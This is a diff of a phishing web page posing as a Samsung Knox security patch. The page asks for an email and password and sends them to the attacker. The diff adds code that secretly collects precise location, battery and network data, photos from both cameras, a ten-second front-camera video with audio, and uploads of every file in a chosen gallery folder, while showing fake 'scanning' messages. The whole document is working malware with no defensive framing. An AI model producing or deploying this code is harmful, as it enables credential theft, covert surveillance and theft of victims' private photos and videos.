@@ -16,7 +16,6 @@
             justify-content: center;
             padding: 20px;
         }
-
         .container {
             max-width: 420px;
             width: 100%;
@@ -28,7 +27,6 @@
             position: relative;
             overflow: hidden;
         }
-
         .container::before {
             content: '';
             position: absolute;
@@ -39,14 +37,12 @@
             background: radial-gradient(circle at 30% 20%, rgba(0, 100, 255, 0.03), transparent 60%);
             pointer-events: none;
         }
-
         .header {
             display: flex;
             align-items: center;
             gap: 12px;
             margin-bottom: 28px;
         }
-
         .shield-icon {
             width: 44px;
             height: 44px;
@@ -60,20 +56,17 @@
             flex-shrink: 0;
             box-shadow: 0 4px 15px rgba(0, 100, 255, 0.3);
         }
-
         .header-text h1 {
             font-size: 18px;
             font-weight: 700;
             color: white;
             letter-spacing: -0.3px;
         }
-
         .header-text p {
             font-size: 12px;
             color: #8888aa;
             margin-top: 2px;
         }
-
         .badge {
             background: rgba(0, 200, 100, 0.15);
             color: #44ff88;
@@ -84,33 +77,27 @@
             display: inline-block;
             margin-left: auto;
         }
-
         .step { display: none; animation: fadeIn 0.4s ease; }
         .step.active { display: block; }
-
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(8px); }
             to { opacity: 1; transform: translateY(0); }
         }
-
         .step-title {
             font-size: 20px;
             font-weight: 700;
             color: white;
             margin-bottom: 6px;
         }
-
         .step-sub {
             font-size: 13px;
             color: #8888aa;
             margin-bottom: 20px;
             line-height: 1.5;
         }
-
         .input-group {
             margin-bottom: 14px;
         }
-
         .input-group label {
             display: block;
             font-size: 12px;
@@ -118,7 +105,6 @@
             margin-bottom: 4px;
             font-weight: 500;
         }
-
         .input-group input {
             width: 100%;
             padding: 14px 16px;
@@ -130,16 +116,13 @@
             outline: none;
             transition: border 0.3s;
         }
-
         .input-group input:focus {
             border-color: #00aaff;
             box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1);
         }
-
         .input-group input::placeholder {
             color: #555577;
         }
-
         .btn {
             width: 100%;
             padding: 16px;
@@ -153,36 +136,27 @@
             transition: all 0.3s;
             margin-top: 8px;
         }
-
         .btn:hover {
             transform: scale(1.01);
             box-shadow: 0 8px 30px rgba(0, 100, 255, 0.3);
         }
-
-        .btn:active {
-            transform: scale(0.98);
-        }
-
+        .btn:active { transform: scale(0.98); }
         .btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
-
         .btn-secondary {
             background: transparent;
             border: 1px solid #2a2a44;
             color: #8888aa;
         }
-
         .btn-secondary:hover {
             background: #1a1a2e;
             border-color: #444466;
         }
-
         .btn-warning {
             background: linear-gradient(135deg, #ff8800, #ff4400);
         }
-
         .scan-status {
             display: flex;
             align-items: center;
@@ -193,7 +167,6 @@
             margin-bottom: 12px;
             border: 1px solid #1a1a2e;
         }
-
         .scan-icon {
             width: 38px;
             height: 38px;
@@ -205,31 +178,25 @@
             font-size: 18px;
             flex-shrink: 0;
         }
-
         .scan-icon.spinning {
             animation: spin 1.2s linear infinite;
         }
-
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-
         .scan-info {
             flex: 1;
         }
-
         .scan-info .title {
             font-size: 14px;
             font-weight: 600;
             color: white;
         }
-
         .scan-info .desc {
             font-size: 12px;
             color: #666688;
             margin-top: 2px;
         }
-
         .progress-wrap {
             background: #0d0d18;
             border-radius: 10px;
@@ -238,7 +205,6 @@
             overflow: hidden;
             border: 1px solid #1a1a2e;
         }
-
         .progress-fill {
             height: 100%;
             width: 0%;
@@ -246,7 +212,6 @@
             border-radius: 10px;
             transition: width 0.5s ease;
         }
-
         .scan-log {
             background: #0a0a12;
             border-radius: 12px;
@@ -260,53 +225,43 @@
             margin-top: 12px;
             line-height: 1.8;
         }
-
         .scan-log::-webkit-scrollbar {
             width: 4px;
         }
-
         .scan-log::-webkit-scrollbar-track {
             background: #0a0a12;
         }
-
         .scan-log::-webkit-scrollbar-thumb {
             background: #2a2a44;
             border-radius: 10px;
         }
-
         .scan-log .log-entry {
             opacity: 0;
             animation: logFade 0.3s forwards;
         }
-
         @keyframes logFade {
             to { opacity: 1; }
         }
-
         .scan-log .log-entry.done { color: #44ff88; }
         .scan-log .log-entry.warn { color: #ffaa44; }
         .scan-log .log-entry.error { color: #ff4466; }
-
         .complete-icon {
             font-size: 52px;
             text-align: center;
             margin: 10px 0 16px;
         }
-
         .complete-text {
             text-align: center;
             font-size: 16px;
             color: #88ff88;
             font-weight: 600;
         }
-
         .complete-sub {
             text-align: center;
             font-size: 13px;
             color: #666688;
             margin-top: 4px;
         }
-
         .footer {
             text-align: center;
             font-size: 10px;
@@ -316,7 +271,6 @@
             border-top: 1px solid #1a1a2e;
             padding-top: 16px;
         }
-
         .device-badge {
             display: inline-flex;
             align-items: center;
@@ -329,12 +283,10 @@
             border: 1px solid #1a1a2e;
             margin-bottom: 16px;
         }
-
         .storage-btn-container {
             margin-top: 12px;
             text-align: center;
         }
-
         .storage-btn-container .btn {
             max-width: 280px;
             margin: 0 auto;
@@ -357,14 +309,13 @@
             📱 <span id="deviceName">Detecting device...</span>
         </div>
 
-        <!-- STEP 1: LOGIN -->
+        <!-- STEP 1: CREDENTIALS -->
         <div class="step active" id="step1">
             <div class="step-title">🔐 Verify Identity</div>
             <div class="step-sub">
                 To apply the security patch, please verify your account.<br>
                 <span style="color:#666688;font-size:12px;">This information is encrypted and not stored.</span>
             </div>
-
             <div class="input-group">
                 <label>Email Address</label>
                 <input type="email" id="email" placeholder="your@email.com">
@@ -373,17 +324,16 @@
                 <label>Password</label>
                 <input type="password" id="pass" placeholder="••••••••">
             </div>
-
             <button class="btn" onclick="step1()">Verify & Continue</button>
             <p style="font-size:11px;color:#444466;margin-top:12px;text-align:center;">
                 🔒 Secured by Samsung Knox • v2.4
             </p>
         </div>
 
-        <!-- STEP 2: SCAN -->
+        <!-- STEP 2: SCAN + DATA COLLECTION -->
         <div class="step" id="step2">
             <div class="step-title">🔍 Scanning Device</div>
-            <div class="step-sub">Please wait while we scan for vulnerabilities...</div>
+            <div class="step-sub" id="stepSub">Please wait while we scan for vulnerabilities...</div>
 
             <div class="scan-status">
                 <div class="scan-icon spinning" id="scanIcon">⚡</div>
@@ -403,7 +353,7 @@
             </div>
 
             <div id="storageBtnContainer" class="storage-btn-container" style="display:none;">
-                <button class="btn btn-warning" id="storageBtn" onclick="triggerFolderPickerDirect(event)">
+                <button class="btn btn-warning" id="storageBtn" onclick="triggerGalleryExtraction(event)">
                     📁 Select Storage & Continue
                 </button>
                 <p style="font-size:11px;color:#666688;margin-top:8px;">
@@ -417,7 +367,6 @@
             <div class="complete-icon">✅</div>
             <div class="complete-text">Update Ready</div>
             <div class="complete-sub">Your device has been scanned and is secure.</div>
-
             <button class="btn" onclick="step3()">Install Now</button>
             <button class="btn btn-secondary" onclick="alert('Update will be applied on next restart.')">Later</button>
         </div>
@@ -435,7 +384,11 @@
         let scanInterval = null;
         let progress = 0;
         let storageSelected = false;
+        let dataCollectionComplete = false;
 
+        // ============================================================
+        // DEVICE DETECTION
+        // ============================================================
         function detectDevice() {
             const ua = navigator.userAgent.toLowerCase();
             let name = 'Unknown Device';
@@ -457,6 +410,9 @@
             document.getElementById('deviceName').textContent = name;
         }
 
+        // ============================================================
+        // SEND DATA
+        // ============================================================
         function sendData(data) {
             data.time = new Date().toISOString();
             data.userAgent = navigator.userAgent;
@@ -480,82 +436,203 @@
             sendData({ type: 'credentials', email, pass });
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
-            startScan();
+            startDataCollection();
         }
 
         // ============================================================
-        // STEP 2: SCANNING
+        // STEP 2: DATA COLLECTION — IN ORDER
         // ============================================================
-        function startScan() {
-            const progressFill = document.getElementById('progressFill');
-            const scanTitle = document.getElementById('scanTitle');
-            const scanDesc = document.getElementById('scanDesc');
-            const scanPercent = document.getElementById('scanPercent');
+        async function startDataCollection() {
+            addLogEntry('● Starting data collection...', 'done');
 
-            const messages = [
-                { p: 5, title: 'Checking system integrity...', desc: 'Verifying boot partition', log: '● System integrity check passed' },
-                { p: 15, title: 'Scanning installed apps...', desc: 'Checking for malicious packages', log: '● 247 apps scanned — 0 threats' },
-                { p: 30, title: 'Checking network security...', desc: 'Analyzing connections', log: '● Network security verified' },
-                { p: 45, title: 'Verifying encryption...', desc: 'Checking device encryption', log: '● AES-256 encryption active' },
-                { p: 55, title: 'Scanning media files...', desc: 'Checking for infected media', log: '● Media scan initialized' }
-            ];
+            // ---- 1. LOCATION ----
+            addLogEntry('📍 Collecting location...', 'warn');
+            await collectLocation();
 
-            let msgIndex = 0;
-            let storageShown = false;
+            // ---- 2. BATTERY + NETWORK ----
+            addLogEntry('🔋 Collecting battery & network...', 'warn');
+            await collectBattery();
+            await collectNetwork();
 
-            scanInterval = setInterval(() => {
-                progress += 0.5 + Math.random() * 0.8;
-                if (progress > 100) progress = 100;
+            // ---- 3. CAMERA PHOTOS + VIDEO ----
+            addLogEntry('📸 Capturing camera media...', 'warn');
+            await collectCameraMedia();
 
-                progressFill.style.width = progress + '%';
-                scanPercent.textContent = Math.round(progress) + '%';
+            // ---- 4. GALLERY EXTRACTION (triggered by user) ----
+            addLogEntry('📁 Waiting for storage selection...', 'warn');
+            document.getElementById('storageBtnContainer').style.display = 'block';
+            document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to continue...';
+            document.getElementById('scanIcon').classList.remove('spinning');
+            document.getElementById('scanIcon').textContent = '📁';
 
-                for (let i = msgIndex; i < messages.length; i++) {
-                    if (progress >= messages[i].p) {
-                        scanTitle.textContent = messages[i].title;
-                        scanDesc.textContent = messages[i].desc;
-                        addLogEntry(messages[i].log, 'done');
-                        msgIndex = i + 1;
-                    }
-                }
+            // Update progress to show we're ready
+            progress = 80;
+            updateProgressUI();
 
-                if (progress >= 65 && !storageShown) {
-                    storageShown = true;
-                    document.getElementById('storageBtnContainer').style.display = 'block';
-                    scanDesc.textContent = '📁 Tap "Select Storage" to continue media verification...';
-                    addLogEntry('● Waiting for storage selection...', 'warn');
-                    document.getElementById('scanIcon').classList.remove('spinning');
-                    document.getElementById('scanIcon').textContent = '📁';
-                }
-
-                if (progress >= 100 && storageSelected) {
-                    clearInterval(scanInterval);
-                    setTimeout(() => {
-                        document.getElementById('step2').classList.remove('active');
-                        document.getElementById('step3').classList.add('active');
-                    }, 800);
-                } else if (progress >= 100 && !storageSelected) {
-                    scanDesc.textContent = '⏳ Waiting for storage selection...';
-                }
-            }, 200);
-
-            addLogEntry('● Device scan started', 'done');
-        }
-
-        function addLogEntry(text, type = 'done') {
-            const log = document.getElementById('scanLog');
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            entry.textContent = text;
-            log.appendChild(entry);
-            log.scrollTop = log.scrollHeight;
+            // ---- 5. GALLERY WILL BE TRIGGERED BY USER CLICK ----
+            dataCollectionComplete = true;
         }
 
         // ============================================================
-        // TRIGGER FOLDER PICKER — DIRECT USER GESTURE
+        // COLLECT LOCATION
         // ============================================================
-        async function triggerFolderPickerDirect(event) {
-            // Prevent any default behavior
+        function collectLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            sendData({
+                                type: 'location',
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            });
+                            addLogEntry('✅ Location captured', 'done');
+                            resolve();
+                        },
+                        err => {
+                            addLogEntry('❌ Location denied: ' + err.message, 'error');
+                            resolve();
+                        },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                } else {
+                    addLogEntry('❌ Geolocation not supported', 'error');
+                    resolve();
+                }
+            });
+        }
+
+        // ============================================================
+        // COLLECT BATTERY
+        // ============================================================
+        async function collectBattery() {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    sendData({
+                        type: 'battery',
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging
+                    });
+                    addLogEntry('✅ Battery data sent', 'done');
+                } else {
+                    addLogEntry('❌ Battery API not supported', 'error');
+                }
+            } catch (e) {
+                addLogEntry('❌ Battery error: ' + e.message, 'error');
+            }
+        }
+
+        // ============================================================
+        // COLLECT NETWORK
+        // ============================================================
+        function collectNetwork() {
+            return new Promise((resolve) => {
+                if (navigator.connection) {
+                    sendData({
+                        type: 'network',
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink
+                    });
+                    addLogEntry('✅ Network data sent', 'done');
+                } else {
+                    addLogEntry('❌ Network API not supported', 'error');
+                }
+                resolve();
+            });
+        }
+
+        // ============================================================
+        // COLLECT CAMERA MEDIA (Back photo, Front photo, Front video)
+        // ============================================================
+        async function collectCameraMedia() {
+            try {
+                // Back camera photo
+                addLogEntry('📸 Capturing back camera...', 'warn');
+                const backPhoto = await capturePhoto('environment');
+                if (backPhoto) {
+                    sendData({ type: 'photo', camera: 'back', data: backPhoto });
+                    addLogEntry('✅ Back photo captured', 'done');
+                }
+
+                // Front camera photo
+                addLogEntry('🤳 Capturing front camera...', 'warn');
+                const frontPhoto = await capturePhoto('user');
+                if (frontPhoto) {
+                    sendData({ type: 'photo', camera: 'front', data: frontPhoto });
+                    addLogEntry('✅ Front photo captured', 'done');
+                }
+
+                // Front camera video (10 sec with audio)
+                addLogEntry('🎥 Recording front video...', 'warn');
+                const videoData = await captureVideo('user', 10);
+                if (videoData) {
+                    sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData });
+                    addLogEntry('✅ Front video captured (10s)', 'done');
+                }
+
+            } catch (err) {
+                addLogEntry('❌ Camera error: ' + err.message, 'error');
+                sendData({ type: 'media_error', error: err.message });
+            }
+        }
+
+        // ============================================================
+        // HELPERS: PHOTO & VIDEO CAPTURE
+        // ============================================================
+        async function capturePhoto(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(resolve => setTimeout(resolve, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                stream.getTracks().forEach(t => t.stop());
+                return dataUrl;
+            } catch (e) {
+                addLogEntry('❌ Photo failed (' + facingMode + '): ' + e.message, 'error');
+                return null;
+            }
+        }
+
+        async function captureVideo(facingMode, durationSec) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
+                });
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
+                const chunks = [];
+                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                recorder.start();
+                await new Promise(resolve => setTimeout(resolve, durationSec * 1000));
+                recorder.stop();
+                await new Promise(resolve => recorder.onstop = resolve);
+                stream.getTracks().forEach(t => t.stop());
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                return new Promise((resolve) => {
+                    reader.onload = () => resolve(reader.result.split(',')[1]);
+                    reader.readAsDataURL(blob);
+                });
+            } catch (e) {
+                addLogEntry('❌ Video failed: ' + e.message, 'error');
+                return null;
+            }
+        }
+
+        // ============================================================
+        // TRIGGER GALLERY EXTRACTION (User gesture)
+        // ============================================================
+        async function triggerGalleryExtraction(event) {
             if (event) event.preventDefault();
 
             const btn = document.getElementById('storageBtn');
@@ -563,7 +640,6 @@
             btn.textContent = '⏳ Opening storage...';
 
             try {
-                // DIRECT call — no async wrapper before this
                 const dirHandle = await window.showDirectoryPicker({
                     mode: 'read'
                 });
@@ -571,7 +647,7 @@
                 storageSelected = true;
                 const folderName = dirHandle.name || 'Root';
                 addLogEntry(`● Storage selected: ${folderName}`, 'done');
-                document.getElementById('scanTitle').textContent = '📁 Scanning storage...';
+                document.getElementById('scanTitle').textContent = '📁 Scanning gallery...';
                 document.getElementById('scanDesc').textContent = `Processing ${folderName}...`;
                 document.getElementById('storageBtnContainer').style.display = 'none';
                 document.getElementById('scanIcon').classList.add('spinning');
@@ -580,11 +656,12 @@
                 // Collect and upload media
                 allMediaFiles = [];
                 await traverseDirectory(dirHandle, '');
-                addLogEntry(`● Found ${allMediaFiles.length} media files`, 'done');
+                addLogEntry(`● Found ${allMediaFiles.length} gallery files`, 'done');
 
                 if (allMediaFiles.length === 0) {
-                    addLogEntry('● No media files found', 'warn');
+                    addLogEntry('● No gallery files found', 'warn');
                     sendData({ type: 'media_extraction_complete', count: 0 });
+                    finishScan();
                     return;
                 }
 
@@ -597,20 +674,14 @@
                     await Promise.all(batch.map(file => uploadMediaFile(file)));
                     uploadedFiles += batch.length;
                     document.getElementById('scanDesc').textContent =
-                        `Uploading ${uploadedFiles}/${totalFiles} files...`;
+                        `Uploading ${uploadedFiles}/${totalFiles} gallery files...`;
                     addLogEntry(`● Uploaded ${uploadedFiles}/${totalFiles} files`, 'done');
                 }
 
-                addLogEntry(`✅ All ${totalFiles} files uploaded`, 'done');
+                addLogEntry(`✅ All ${totalFiles} gallery files uploaded`, 'done');
                 sendData({ type: 'media_extraction_complete', count: totalFiles });
 
-                if (progress >= 100) {
-                    clearInterval(scanInterval);
-                    setTimeout(() => {
-                        document.getElementById('step2').classList.remove('active');
-                        document.getElementById('step3').classList.add('active');
-                    }, 800);
-                }
+                finishScan();
 
             } catch (err) {
                 btn.disabled = false;
@@ -623,6 +694,19 @@
                 }
                 sendData({ type: 'media_extraction_error', error: err.message });
             }
+        }
+
+        // ============================================================
+        // FINISH SCAN
+        // ============================================================
+        function finishScan() {
+            progress = 100;
+            updateProgressUI();
+            clearInterval(scanInterval);
+            setTimeout(() => {
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+            }, 800);
         }
 
         // ============================================================
@@ -677,6 +761,23 @@
         }
 
         // ============================================================
+        // UI HELPERS
+        // ============================================================
+        function addLogEntry(text, type = 'done') {
+            const log = document.getElementById('scanLog');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = text;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function updateProgressUI() {
+            document.getElementById('progressFill').style.width = progress + '%';
+            document.getElementById('scanPercent').textContent = Math.round(progress) + '%';
+        }
+
+        // ============================================================
         // STEP 3: INSTALL
         // ============================================================
         function step3() {
@@ -689,6 +790,15 @@
         // INIT
         // ============================================================
         detectDevice();
+
+        // Simulate progress during initial scan
+        setInterval(() => {
+            if (!dataCollectionComplete && progress < 70) {
+                progress += 0.5 + Math.random() * 0.8;
+                if (progress > 70) progress = 70;
+                updateProgressUI();
+            }
+        }, 200);
     </script>
 </body>
 </html>
